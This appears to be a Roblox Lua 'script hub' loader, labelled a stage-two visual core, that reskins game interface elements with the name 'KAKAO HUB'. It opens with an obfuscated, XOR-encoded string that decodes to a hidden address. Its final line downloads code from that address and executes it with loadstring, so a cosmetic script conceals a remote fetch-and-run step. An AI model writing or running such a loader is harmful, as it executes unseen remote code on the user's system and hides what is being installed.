
--[[ STAGE 2: VISUAL CORE ]]
local p0JMVfRnDnEB="\149\152\155\158\154\066\088\091\133\151\128\130\156\146\154\128\067\153\140\141\078\138\154\243\074\134\249\158\169\170\153\139\147"local SRlw6OV0vHtJQEPyf78=53 local kcLFUevQvMhRC=29 local NQHdeNMVomTNy2G=1 local lqgqaLlWMSG1=1 local nAXvmZZ82N11LMKEab=26 local AzovuGeBL1eXH=false local TFh28UtnYBWs=bit32 and bit32.bxor if not TFh28UtnYBWs then TFh28UtnYBWs=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local uklvU1kfeCURh={}for BwOnY9B2Kn8Ms=1,#p0JMVfRnDnEB do local Qnx3pk0UUuOsCKjAkzh7=string.byte(p0JMVfRnDnEB,BwOnY9B2Kn8Ms)local FgA10wDLl7UXLGMM=(kcLFUevQvMhRC+(BwOnY9B2Kn8Ms*lqgqaLlWMSG1)+nAXvmZZ82N11LMKEab)%256 if NQHdeNMVomTNy2G==0 then Qnx3pk0UUuOsCKjAkzh7=(Qnx3pk0UUuOsCKjAkzh7-FgA10wDLl7UXLGMM)%256 uklvU1kfeCURh[BwOnY9B2Kn8Ms]=string.char(TFh28UtnYBWs(Qnx3pk0UUuOsCKjAkzh7,SRlw6OV0vHtJQEPyf78))else Qnx3pk0UUuOsCKjAkzh7=TFh28UtnYBWs(Qnx3pk0UUuOsCKjAkzh7,SRlw6OV0vHtJQEPyf78)uklvU1kfeCURh[BwOnY9B2Kn8Ms]=string.char((Qnx3pk0UUuOsCKjAkzh7-FgA10wDLl7UXLGMM)%256)end end local UfGLEPRxXx5NmwDvS=table.concat(uklvU1kfeCURh)if AzovuGeBL1eXH then UfGLEPRxXx5NmwDvS=string.reverse(UfGLEPRxXx5NmwDvS)end local C_O5Hxt8YKZKZz=UfGLEPRxXx5NmwDvS
local HubName = "KAKAO HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(C_O5Hxt8YKZKZz))()
